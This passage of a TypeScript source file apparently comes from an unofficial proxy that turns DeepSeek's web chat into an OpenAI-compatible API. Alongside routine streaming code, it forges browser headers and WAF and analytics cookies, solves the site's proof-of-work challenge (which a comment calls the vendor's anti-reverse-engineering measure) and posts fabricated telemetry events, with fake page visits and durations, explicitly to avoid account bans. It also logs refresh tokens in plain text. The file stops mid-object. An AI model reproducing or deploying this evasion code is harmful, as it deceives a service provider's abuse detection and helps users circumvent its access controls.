import { PassThrough } from "stream";
import _ from "lodash";
import axios, { AxiosResponse } from "axios";

import APIException from "@/lib/exceptions/APIException.ts";
import EX from "@/api/consts/exceptions.ts";
import { createParser } from "eventsource-parser";
import { DeepSeekHash } from "@/lib/challenge.ts";
import logger from "@/lib/logger.ts";
import util from "@/lib/util.ts";

// 模型名称
const MODEL_NAME = "deepseek-chat";
// 插冷鸡WASM文件路径
const WASM_PATH = './sha3_wasm_bg.7b9ca65ddd.wasm';
// access_token有效期
const ACCESS_TOKEN_EXPIRES = 3600;
// 最大重试次数
const MAX_RETRY_COUNT = 3;
// 重试延迟
const RETRY_DELAY = 5000;
// 伪装headers
const FAKE_HEADERS = {
  Accept: "*/*",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
  Origin: "https://chat.deepseek.com",
  Pragma: "no-cache",
  Priority: "u=1, i",
  Referer: "https://chat.deepseek.com/",
  "Sec-Ch-Ua":
    '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
  "Sec-Ch-Ua-Mobile": "?0",
  "Sec-Ch-Ua-Platform": '"macOS"',
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "User-Agent":
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  "X-App-Version": "20241129.1",
  "X-Client-Locale": "zh-CN",
  "X-Client-Platform": "web",
  "X-Client-Version": "1.0.0-always",
};
const EVENT_COMMIT_ID = '41e9c7b1';
// 当前IP地址
let ipAddress = '';
// access_token映射
const accessTokenMap = new Map();
// access_token请求队列映射
const accessTokenRequestQueueMap: Record<string, Function[]> = {};

async function getIPAddress() {
  if (ipAddress) return ipAddress;
  const result = await axios.get('https://chat.deepseek.com/', {
    headers: {
      ...FAKE_HEADERS,
      Cookie: generateCookie()
    },
    timeout: 15000,
    validateStatus: () => true,
  });
  const ip = result.data.match(/<meta name="ip" content="([\d.]+)">/)?.[1];
  if (!ip) throw new APIException(EX.API_REQUEST_FAILED, '获取IP地址失败');
  logger.info(`当前IP地址: ${ip}`);
  ipAddress = ip;
  return ip;
}

/**
 * 请求access_token
 *
 * 使用refresh_token去刷新获得access_token
 *
 * @param refreshToken 用于刷新access_token的refresh_token
 */
async function requestToken(refreshToken: string) {
  if (accessTokenRequestQueueMap[refreshToken])
    return new Promise((resolve) =>
      accessTokenRequestQueueMap[refreshToken].push(resolve)
    );
  accessTokenRequestQueueMap[refreshToken] = [];
  logger.info(`Refresh token: ${refreshToken}`);
  const result = await (async () => {
    const result = await axios.get(
      "https://chat.deepseek.com/api/v0/users/current",
      {
        headers: {
          Authorization: `Bearer ${refreshToken}`,
          ...FAKE_HEADERS,
        },
        timeout: 15000,
        validateStatus: () => true,
      }
    );
    const { biz_data } = checkResult(result, refreshToken);
    const { token } = biz_data;
    return {
      accessToken: token,
      refreshToken: token,
      refreshTime: util.unixTimestamp() + ACCESS_TOKEN_EXPIRES,
    };
  })()
    .then((result) => {
      if (accessTokenRequestQueueMap[refreshToken]) {
        accessTokenRequestQueueMap[refreshToken].forEach((resolve) =>
          resolve(result)
        );
        delete accessTokenRequestQueueMap[refreshToken];
      }
      logger.success(`Refresh successful`);
      return result;
    })
    .catch((err) => {
      if (accessTokenRequestQueueMap[refreshToken]) {
        accessTokenRequestQueueMap[refreshToken].forEach((resolve) =>
          resolve(err)
        );
        delete accessTokenRequestQueueMap[refreshToken];
      }
      return err;
    });
  if (_.isError(result)) throw result;
  return result;
}

/**
 * 获取缓存中的access_token
 *
 * 避免短时间大量刷新token，未加锁，如果有并发要求还需加锁
 *
 * @param refreshToken 用于刷新access_token的refresh_token
 */
async function acquireToken(refreshToken: string): Promise<string> {
  let result = accessTokenMap.get(refreshToken);
  if (!result) {
    result = await requestToken(refreshToken);
    accessTokenMap.set(refreshToken, result);
  }
  if (util.unixTimestamp() > result.refreshTime) {
    result = await requestToken(refreshToken);
    accessTokenMap.set(refreshToken, result);
  }
  return result.accessToken;
}

/**
 * 生成cookie
 */
function generateCookie() {
  return `intercom-HWWAFSESTIME=${util.timestamp()}; HWWAFSESID=${util.generateRandomString({
    charset: 'hex',
    length: 18
  })}; Hm_lvt_${util.uuid(false)}=${util.unixTimestamp()},${util.unixTimestamp()},${util.unixTimestamp()}; Hm_lpvt_${util.uuid(false)}=${util.unixTimestamp()}; _frid=${util.uuid(false)}; _fr_ssid=${util.uuid(false)}; _fr_pvid=${util.uuid(false)}`
}

async function createSession(model: string, refreshToken: string): Promise<string> {
  const token = await acquireToken(refreshToken);
  const result = await axios.post(
    "https://chat.deepseek.com/api/v0/chat_session/create",
    {
      character_id: null
    },
    {
      headers: {
        Authorization: `Bearer ${token}`,
        ...FAKE_HEADERS,
      },
      timeout: 15000,
      validateStatus: () => true,
    }
  );
  const { biz_data } = checkResult(result, refreshToken);
  if (!biz_data)
    throw new APIException(EX.API_REQUEST_FAILED, "创建会话失败，可能是账号或IP地址被封禁");
  return biz_data.id;
}

/**
 * 碰撞challenge答案
 * 
 * 厂商这个反逆向的策略不错哦
 * 相当于把计算量放在浏览器侧的话，用户分摊了这个计算量
 * 但是如果逆向在服务器上算，那这个成本都在服务器集中，并发一高就GG
 */
async function answerChallenge(response: any, targetPath: string): Promise<any> {
  const { algorithm, challenge, salt, difficulty, expire_at, signature } = response;
  const deepSeekHash = new DeepSeekHash();
  await deepSeekHash.init(WASM_PATH);
  const answer = deepSeekHash.calculateHash(algorithm, challenge, salt, difficulty, expire_at);
  return Buffer.from(JSON.stringify({
    algorithm,
    challenge,
    salt,
    answer,
    signature,
    target_path: targetPath
  })).toString('base64');
}

/**
 * 获取challenge响应
 *
 * @param refreshToken 用于刷新access_token的refresh_token
 */
async function getChallengeResponse(refreshToken: string, targetPath: string) {
  const token = await acquireToken(refreshToken);
  const result = await axios.post('https://chat.deepseek.com/api/v0/chat/create_pow_challenge', {
    target_path: targetPath
  }, {
    headers: {
      Authorization: `Bearer ${token}`,
      ...FAKE_HEADERS,
      // Cookie: generateCookie()
    },
    timeout: 15000,
    validateStatus: () => true,
  });
  const { biz_data: { challenge } } = checkResult(result, refreshToken);
  return challenge;
}

/**
 * 同步对话补全
 *
 * @param model 模型名称
 * @param messages 参考gpt系列消息格式，多轮对话请完整提供上下文
 * @param refreshToken 用于刷新access_token的refresh_token
 * @param refConvId 引用对话ID
 * @param retryCount 重试次数
 */
async function createCompletion(
  model = MODEL_NAME,
  messages: any[],
  refreshToken: string,
  refConvId?: string,
  retryCount = 0
) {
  return (async () => {
    logger.info(messages);

    // 如果引用对话ID不正确则重置引用
    if (!/[0-9a-z\-]{36}@[0-9]+/.test(refConvId))
      refConvId = null;

    // 消息预处理
    const prompt = messagesPrepare(messages);

    // 解析引用对话ID
    const [refSessionId, refParentMsgId] = refConvId?.split('@') || [];

    // 请求流
    const token = await acquireToken(refreshToken);

    const isSearchModel = model.includes('search') || prompt.includes('联网搜索');
    const isThinkingModel = model.includes('think') || model.includes('r1') || prompt.includes('深度思考');

    // 已经支持同时使用，此处注释
    // if(isSearchModel && isThinkingModel)
    //   throw new APIException(EX.API_REQUEST_FAILED, '深度思考和联网搜索不能同时使用');

    if (isThinkingModel) {
      const thinkingQuota = await getThinkingQuota(refreshToken);
      if (thinkingQuota <= 0) {
        throw new APIException(EX.API_REQUEST_FAILED, '深度思考配额不足');
      }
    }

    const challengeResponse = await getChallengeResponse(refreshToken, '/api/v0/chat/completion');
    const challenge = await answerChallenge(challengeResponse, '/api/v0/chat/completion');
    logger.info(`插冷鸡: ${challenge}`);

    // 创建会话
    const sessionId = refSessionId || await createSession(model, refreshToken);

    const result = await axios.post(
      "https://chat.deepseek.com/api/v0/chat/completion",
      {
        chat_session_id: sessionId,
        parent_message_id: refParentMsgId || null,
        prompt,
        ref_file_ids: [],
        search_enabled: isSearchModel,
        thinking_enabled: isThinkingModel
      },
      {
        headers: {
          Authorization: `Bearer ${token}`,
          ...FAKE_HEADERS,
          Cookie: generateCookie(),
          'X-Ds-Pow-Response': challenge
        },
        // 120秒超时
        timeout: 120000,
        validateStatus: () => true,
        responseType: "stream",
      }
    );

    // 发送事件，缓解被封号风险
    await sendEvents(sessionId, refreshToken);

    if (result.headers["content-type"].indexOf("text/event-stream") == -1) {
      result.data.on("data", buffer => logger.error(buffer.toString()));
      throw new APIException(
        EX.API_REQUEST_FAILED,
        `Stream response Content-Type invalid: ${result.headers["content-type"]}`
      );
    }

    const streamStartTime = util.timestamp();
    // 接收流为输出文本
    const answer = await receiveStream(model, result.data, sessionId);
    logger.success(
      `Stream has completed transfer ${util.timestamp() - streamStartTime}ms`
    );

    return answer;
  })().catch((err) => {
    if (retryCount < MAX_RETRY_COUNT) {
      logger.error(`Stream response error: ${err.stack}`);
      logger.warn(`Try again after ${RETRY_DELAY / 1000}s...`);
      return (async () => {
        await new Promise((resolve) => setTimeout(resolve, RETRY_DELAY));
        return createCompletion(
          model,
          messages,
          refreshToken,
          refConvId,
          retryCount + 1
        );
      })();
    }
    throw err;
  });
}

/**
 * 流式对话补全
 *
 * @param model 模型名称
 * @param messages 参考gpt系列消息格式，多轮对话请完整提供上下文
 * @param refreshToken 用于刷新access_token的refresh_token
 * @param refConvId 引用对话ID
 * @param retryCount 重试次数
 */
async function createCompletionStream(
  model = MODEL_NAME,
  messages: any[],
  refreshToken: string,
  refConvId?: string,
  retryCount = 0
) {
  return (async () => {
    logger.info(messages);

    // 如果引用对话ID不正确则重置引用
    if (!/[0-9a-z\-]{36}@[0-9]+/.test(refConvId))
      refConvId = null;

    // 消息预处理
    const prompt = messagesPrepare(messages);

    // 解析引用对话ID
    const [refSessionId, refParentMsgId] = refConvId?.split('@') || [];

    const isSearchModel = model.includes('search') || prompt.includes('联网搜索');
    const isThinkingModel = model.includes('think') || model.includes('r1') || prompt.includes('深度思考');

    // 已经支持同时使用，此处注释
    // if(isSearchModel && isThinkingModel)
    //   throw new APIException(EX.API_REQUEST_FAILED, '深度思考和联网搜索不能同时使用');

    if (isThinkingModel) {
      const thinkingQuota = await getThinkingQuota(refreshToken);
      if (thinkingQuota <= 0) {
        throw new APIException(EX.API_REQUEST_FAILED, '深度思考配额不足');
      }
    }

    const challengeResponse = await getChallengeResponse(refreshToken, '/api/v0/chat/completion');
    const challenge = await answerChallenge(challengeResponse, '/api/v0/chat/completion');
    logger.info(`插冷鸡: ${challenge}`);

    // 创建会话
    const sessionId = refSessionId || await createSession(model, refreshToken);
    // 请求流
    const token = await acquireToken(refreshToken);

    const result = await axios.post(
      "https://chat.deepseek.com/api/v0/chat/completion",
      {
        chat_session_id: sessionId,
        parent_message_id: refParentMsgId || null,
        prompt,
        ref_file_ids: [],
        search_enabled: isSearchModel,
        thinking_enabled: isThinkingModel
      },
      {
        headers: {
          Authorization: `Bearer ${token}`,
          ...FAKE_HEADERS,
          Cookie: generateCookie(),
          'X-Ds-Pow-Response': challenge
        },
        // 120秒超时
        timeout: 120000,
        validateStatus: () => true,
        responseType: "stream",
      }
    );

    // 发送事件，缓解被封号风险
    await sendEvents(sessionId, refreshToken);

    if (result.headers["content-type"].indexOf("text/event-stream") == -1) {
      logger.error(
        `Invalid response Content-Type:`,
        result.headers["content-type"]
      );
      result.data.on("data", buffer => logger.error(buffer.toString()));
      const transStream = new PassThrough();
      transStream.end(
        `data: ${JSON.stringify({
          id: "",
          model: MODEL_NAME,
          object: "chat.completion.chunk",
          choices: [
            {
              index: 0,
              delta: {
                role: "assistant",
                content: "服务暂时不可用，第三方响应错误",
              },
              finish_reason: "stop",
            },
          ],
          usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
          created: util.unixTimestamp(),
        })}\n\n`
      );
      return transStream;
    }
    const streamStartTime = util.timestamp();
    // 创建转换流将消息格式转换为gpt兼容格式
    return createTransStream(model, result.data, sessionId, () => {
      logger.success(
        `Stream has completed transfer ${util.timestamp() - streamStartTime}ms`
      );
    });
  })().catch((err) => {
    if (retryCount < MAX_RETRY_COUNT) {
      logger.error(`Stream response error: ${err.stack}`);
      logger.warn(`Try again after ${RETRY_DELAY / 1000}s...`);
      return (async () => {
        await new Promise((resolve) => setTimeout(resolve, RETRY_DELAY));
        return createCompletionStream(
          model,
          messages,
          refreshToken,
          refConvId,
          retryCount + 1
        );
      })();
    }
    throw err;
  });
}

/**
 * 消息预处理
 *
 * 由于接口只取第一条消息，此处会将多条消息合并为一条，实现多轮对话效果
 *
 * @param messages 参考gpt系列消息格式，多轮对话请完整提供上下文
 */
function messagesPrepare(messages: any[]): string {
  // 处理消息内容
  const processedMessages = messages.map(message => {
    let text: string;
    if (Array.isArray(message.content)) {
      // 过滤出 type 为 "text" 的项并连接文本
      const texts = message.content
        .filter((item: any) => item.type === "text")
        .map((item: any) => item.text);
      text = texts.join('\n');
    } else {
      text = String(message.content);
    }
    return { role: message.role, text };
  });

  if (processedMessages.length === 0) return '';

  // 合并连续相同角色的消息
  const mergedBlocks: { role: string; text: string }[] = [];
  let currentBlock = { ...processedMessages[0] };

  for (let i = 1; i < processedMessages.length; i++) {
    const msg = processedMessages[i];
    if (msg.role === currentBlock.role) {
      currentBlock.text += `\n\n${msg.text}`;
    } else {
      mergedBlocks.push(currentBlock);
      currentBlock = { ...msg };
    }
  }
  mergedBlocks.push(currentBlock);

  // 添加标签并连接结果
  return mergedBlocks
    .map((block, index) => {
      if (block.role === "assistant") {
        return `<｜Assistant｜>${block.text}<｜end▁of▁sentence｜>`;
      }
      
      if (block.role === "user" || block.role === "system") {
        return index > 0 ? `<｜User｜>${block.text}` : block.text;
      }

      return block.text;
    })
    .join('')
    .replace(/\!\[.+\]\(.+\)/g, "");
}

/**
 * 检查请求结果
 *
 * @param result 结果
 * @param refreshToken 用于刷新access_token的refresh_token
 */
function checkResult(result: AxiosResponse, refreshToken: string) {
  if (!result.data) return null;
  const { code, data, msg } = result.data;
  if (!_.isFinite(code)) return result.data;
  if (code === 0) return data;
  if (code == 40003) accessTokenMap.delete(refreshToken);
  throw new APIException(EX.API_REQUEST_FAILED, `[请求deepseek失败]: ${msg}`);
}

/**
 * 从流接收完整的消息内容
 *
 * @param model 模型名称
 * @param stream 消息流
 */
async function receiveStream(model: string, stream: any, refConvId?: string): Promise<any> {
  let thinking = false;
  const isSearchModel = model.includes('search');
  const isThinkingModel = model.includes('think') || model.includes('r1');
  const isSilentModel = model.includes('silent');
  const isFoldModel = model.includes('fold');
  logger.info(`模型: ${model}, 是否思考: ${isThinkingModel} 是否联网搜索: ${isSearchModel}, 是否静默思考: ${isSilentModel}, 是否折叠思考: ${isFoldModel}`);
  let refContent = '';
  return new Promise((resolve, reject) => {
    // 消息初始化
    const data = {
      id: "",
      model,
      object: "chat.completion",
      choices: [
        {
          index: 0,
          message: { role: "assistant", content: "", reasoning_content: "" },
          finish_reason: "stop",
        },
      ],
      usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
      created: util.unixTimestamp(),
    };
    const parser = createParser((event) => {
      try {
        if (event.type !== "event" || event.data.trim() == "[DONE]") return;
        // 解析JSON
        const result = _.attempt(() => JSON.parse(event.data));
        if (_.isError(result))
          throw new Error(`Stream response invalid: ${event.data}`);
        if (!result.choices || !result.choices[0] || !result.choices[0].delta)
          return;
        if (!data.id)
          data.id = `${refConvId}@${result.message_id}`;
        if (result.choices[0].delta.type === "search_result" && !isSilentModel) {
          const searchResults = result.choices[0]?.delta?.search_results || [];
          refContent += searchResults.map(item => `${item.title} - ${item.url}`).join('\n');
          return;
        }
        if (isFoldModel && result.choices[0].delta.type === "thinking") {
          if (!thinking && isThinkingModel && !isSilentModel) {
            thinking = true;
            data.choices[0].message.content += isFoldModel ? "<details><summary>思考过程</summary><pre>" : "[思考开始]\n";
          }
          if (isSilentModel)
            return;
        }
        else if (isFoldModel && thinking && isThinkingModel && !isSilentModel) {
          thinking = false;
          data.choices[0].message.content += isFoldModel ? "</pre></details>" : "\n\n[思考结束]\n";
        }
        if (result.choices[0].delta.content) {
          if(result.choices[0].delta.type === "thinking" && !isFoldModel){
            data.choices[0].message.reasoning_content += result.choices[0].delta.content;
          }else {
            data.choices[0].message.content += result.choices[0].delta.content;
          }
        }
        if (result.choices && result.choices[0] && result.choices[0].finish_reason === "stop") {
          data.choices[0].message.content = data.choices[0].message.content.replace(/^\n+/, '').replace(/\[citation:\d+\]/g, '') + (refContent ? `\n\n搜索结果来自：\n${refContent}` : '');
          resolve(data);
        }
      } catch (err) {
        logger.error(err);
        reject(err);
      }
    });
    // 将流数据喂给SSE转换器
    stream.on("data", (buffer) => parser.feed(buffer.toString()));
    stream.once("error", (err) => reject(err));
    stream.once("close", () => resolve(data));
  });
}

/**
 * 创建转换流
 *
 * 将流格式转换为gpt兼容流格式
 *
 * @param model 模型名称
 * @param stream 消息流
 * @param endCallback 传输结束回调
 */
function createTransStream(model: string, stream: any, refConvId: string, endCallback?: Function) {
  let thinking = false;
  const isSearchModel = model.includes('search');
  const isThinkingModel = model.includes('think') || model.includes('r1');
  const isSilentModel = model.includes('silent');
  const isFoldModel = model.includes('fold');
  logger.info(`模型: ${model}, 是否思考: ${isThinkingModel}, 是否联网搜索: ${isSearchModel}, 是否静默思考: ${isSilentModel}, 是否折叠思考: ${isFoldModel}`);
  // 消息创建时间
  const created = util.unixTimestamp();
  // 创建转换流
  const transStream = new PassThrough();
  !transStream.closed &&
    transStream.write(
      `data: ${JSON.stringify({
        id: "",
        model,
        object: "chat.completion.chunk",
        choices: [
          {
            index: 0,
            delta: { role: "assistant", content: "" , reasoning_content: "" },
            finish_reason: null,
          },
        ],
        created,
      })}\n\n`
    );
  const parser = createParser((event) => {
    try {
      if (event.type !== "event" || event.data.trim() == "[DONE]") return;
      // 解析JSON
      const result = _.attempt(() => JSON.parse(event.data));
      if (_.isError(result))
        throw new Error(`Stream response invalid: ${event.data}`);
      if (!result.choices || !result.choices[0] || !result.choices[0].delta)
        return;
      result.model = model;
      if (result.choices[0].delta.type === "search_result" && !isSilentModel) {
        const searchResults = result.choices[0]?.delta?.search_results || [];
        if (searchResults.length > 0) {
          const refContent = searchResults.map(item => `检索 ${item.title} - ${item.url}`).join('\n') + '\n\n';
          transStream.write(`data: ${JSON.stringify({
            id: `${refConvId}@${result.message_id}`,
            model: result.model,
            object: "chat.completion.chunk",
            choices: [
              {
                index: 0,
                delta: { role: "assistant", content: refContent },
                finish_reason: null,
              },
            ],
          })}\n\n`);
        }
        return;
      }
      if (isFoldModel && result.choices[0].delta.type === "thinking") {
        if (!thinking && isThinkingModel && !isSilentModel) {
          thinking = true;
          transStream.write(`data: ${JSON.stringify({
            id: `${refConvId}@${result.message_id}`,
            model: result.model,
            object: "chat.completion.chunk",
            choices: [
              {
                index: 0,
                delta: { role: "assistant", content: isFoldModel ? "<details><summary>思考过程</summary><pre>" : "[思考开始]\n" },
                finish_reason: null,
              },
            ],
            created,
          })}\n\n`);
        }
        if (isSilentModel)
          return;
      }
      else if (isFoldModel && thinking && isThinkingModel && !isSilentModel) {
        thinking = false;
        transStream.write(`data: ${JSON.stringify({
          id: `${refConvId}@${result.message_id}`,
          model: result.model,
          object: "chat.completion.chunk",
          choices: [
            {
              index: 0,
              delta: { role: "assistant", content: isFoldModel ? "</pre></details>" : "\n\n[思考结束]\n" },
              finish_reason: null,
            },
          ],
          created,
        })}\n\n`);
      }

      if (!result.choices[0].delta.content)
        return;

      const deltaContent = result.choices[0].delta.content.replace(/\[citation:\d+\]/g, '');
      const delta = result.choices[0].delta.type === "thinking" && !isFoldModel
          ? { role: "assistant", reasoning_content: deltaContent }
          : { role: "assistant", content: deltaContent };

      transStream.write(`data: ${JSON.stringify({
        id: `${refConvId}@${result.message_id}`,
        model: result.model,
        object: "chat.completion.chunk",
        choices: [
          {
            index: 0,
            delta,
            finish_reason: null,
          },
        ],
        created,
      })}\n\n`);

      if (result.choices && result.choices[0] && result.choices[0].finish_reason === "stop") {
        transStream.write(`data: ${JSON.stringify({
          id: `${refConvId}@${result.message_id}`,
          model: result.model,
          object: "chat.completion.chunk",
          choices: [
            {
              index: 0,
              delta: { role: "assistant", content: "" },
              finish_reason: "stop"
            },
          ],
          created,
        })}\n\n`);
        !transStream.closed && transStream.end("data: [DONE]\n\n");
        endCallback && endCallback();
      }
    } catch (err) {
      logger.error(err);
      !transStream.closed && transStream.end("data: [DONE]\n\n");
    }
  });
  // 将流数据喂给SSE转换器
  stream.on("data", (buffer) => parser.feed(buffer.toString()));
  stream.once(
    "error",
    () => !transStream.closed && transStream.end("data: [DONE]\n\n")
  );
  stream.once(
    "close",
    () => {
      !transStream.closed && transStream.end("data: [DONE]\n\n");
      endCallback && endCallback();
    }
  );
  return transStream;
}

/**
 * Token切分
 *
 * @param authorization 认证字符串
 */
function tokenSplit(authorization: string) {
  return authorization.replace("Bearer ", "").split(",");
}

/**
 * 获取Token存活状态
 */
async function getTokenLiveStatus(refreshToken: string) {
  const token = await acquireToken(refreshToken);
  const result = await axios.get(
    "https://chat.deepseek.com/api/v0/users/current",
    {
      headers: {
        Authorization: `Bearer ${token}`,
        ...FAKE_HEADERS,
        Cookie: generateCookie()
      },
      timeout: 15000,
      validateStatus: () => true,
    }
  );
  try {
    const { token } = checkResult(result, refreshToken);
    return !!token;
  }
  catch (err) {
    return false;
  }
}

async function sendEvents(refConvId: string, refreshToken: string) {
  try {
    const token = await acquireToken(refreshToken);
    const sessionId = `session_v0_${Math.random().toString(36).slice(2)}`;
    const timestamp = util.timestamp();
    const fakeDuration1 = Math.floor(Math.random() * 1000);
    const fakeDuration2 = Math.floor(Math.random() * 1000);
    const fakeDuration3 = Math.floor(Math.random() * 1000);
    const ipAddress = await getIPAddress();
    const response = await axios.post('https://chat.deepseek.com/api/v0/events', {
      "events": [
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp,
          "event_name": "__reportEvent",
          "event_message": "调用上报事件接口",
          "payload": {
            "__location": "https://chat.deepseek.com/",
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "method": "post",
            "url": "/api/v0/events",
            "path": "/api/v0/events"
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 100 + Math.floor(Math.random() * 1000),
          "event_name": "__reportEventOk",
          "event_message": "调用上报事件接口成功",
          "payload": {
            "__location": "https://chat.deepseek.com/",
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "method": "post",
            "url": "/api/v0/events",
            "path": "/api/v0/events",
            "logId": util.uuid(),
            "metricDuration": Math.floor(Math.random() * 1000),
            "status": "200"
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 200 + Math.floor(Math.random() * 1000),
          "event_name": "createSessionAndStartCompletion",
          "event_message": "开始创建对话",
          "payload": {
            "__location": "https://chat.deepseek.com/",
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "__referrer": "",
            "agentId": "chat",
            "thinkingEnabled": false
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 300 + Math.floor(Math.random() * 1000),
          "event_name": "__httpRequest",
          "event_message": "httpRequest POST /api/v0/chat_session/create",
          "payload": {
            "__location": "https://chat.deepseek.com/",
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "__referrer": "",
            "url": "/api/v0/chat_session/create",
            "path": "/api/v0/chat_session/create",
            "method": "POST"
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 400 + Math.floor(Math.random() * 1000),
          "event_name": "__httpResponse",
          "event_message": `httpResponse POST /api/v0/chat_session/create, ${Math.floor(Math.random() * 1000)}ms, reason: none`,
          "payload": {
            "__location": "https://chat.deepseek.com/",
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "url": "/api/v0/chat_session/create",
            "path": "/api/v0/chat_session/create",
            "method": "POST",
            "metricDuration": Math.floor(Math.random() * 1000),
            "status": "200",
            "logId": util.uuid()
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 500 + Math.floor(Math.random() * 1000),
          "event_name": "__log",
          "event_message": "使用 buffer 模式",
          "payload": {
            "__location": "https://chat.deepseek.com/",
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": ""
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 600 + Math.floor(Math.random() * 1000),
          "event_name": "chatCompletionApi",
          "event_message": "chatCompletionApi 被调用",
          "payload": {
            "__location": "https://chat.deepseek.com/",
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "scene": "completion",
            "chatSessionId": refConvId,
            "withFile": "false",
            "thinkingEnabled": "false"
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 700 + Math.floor(Math.random() * 1000),
          "event_name": "__httpRequest",
          "event_message": "httpRequest POST /api/v0/chat/completion",
          "payload": {
            "__location": "https://chat.deepseek.com/",
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "url": "/api/v0/chat/completion",
            "path": "/api/v0/chat/completion",
            "method": "POST"
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 800 + Math.floor(Math.random() * 1000),
          "event_name": "completionFirstChunkReceived",
          "event_message": "收到第一个 completion chunk（可以是空 chunk）",
          "payload": {
            "__location": "https://chat.deepseek.com/",
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "metricDuration": Math.floor(Math.random() * 1000),
            "logId": util.uuid()
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 900 + Math.floor(Math.random() * 1000),
          "event_name": "createSessionAndStartCompletion",
          "event_message": "创建会话并开始补全",
          "payload": {
            "__location": "https://chat.deepseek.com/",
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "agentId": "chat",
            "newSessionId": refConvId,
            "isCreateNewChat": "false",
            "thinkingEnabled": "false"
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 1000 + Math.floor(Math.random() * 1000),
          "event_name": "routeChange",
          "event_message": `路由改变 => /a/chat/s/${refConvId}`,
          "payload": {
            "__location": `https://chat.deepseek.com/a/chat/s/${refConvId}`,
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "to": `/a/chat/s/${refConvId}`,
            "redirect": "false",
            "redirected": "false",
            "redirectReason": "",
            "redirectTo": "/",
            "hasToken": "true",
            "hasUserInfo": "true"
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 1100 + Math.floor(Math.random() * 1000),
          "event_name": "__pageVisit",
          "event_message": `访问页面 [/a/chat/s/${refConvId}] [0]：${fakeDuration1}ms`,
          "payload": {
